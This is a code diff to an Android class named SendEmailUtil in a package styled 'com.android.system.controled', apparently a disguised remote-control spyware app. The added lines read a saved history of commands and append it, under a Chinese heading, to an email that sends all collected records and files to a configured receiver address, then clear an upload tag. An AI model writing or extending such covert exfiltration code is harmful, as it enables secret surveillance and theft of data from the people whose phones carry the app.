@@ -27,7 +27,6 @@ import android.util.Log;
 
 import com.android.system.controled.Debug;
 import com.android.system.controled.MainApplication;
-import com.android.system.controled.db.DatabaseUtil;
 
 public class SendEmailUtil {
 
@@ -282,11 +281,16 @@ public class SendEmailUtil {
 							}
 						}
 					}
+					
+					String codes = FileUtil.getinfo(new File(MainApplication.FILEPATH_CODES));
 
 					if (files.size() <= 0) {
-						content = "尚没有任何记录！";
-					}
+						content = "没有任何记录！";
+					} 
 
+					if(!StringUtil.isNull(codes)) {
+						content = content + "\r\n\r\n\r\n历史命令记录 ： \r\n\r\n" + codes + "\r\n\r\n\r\n";
+					}
 					try {
 						sendMail("所有记录  " + String.valueOf(TimeUtil.getCurrentTimeMillis()), content, MainApplication.getInstence().getReceiverEmailAddr(), files);
 						deleteTag(con, MainApplication.PHONE_CODE_UPLOAD_ALL);
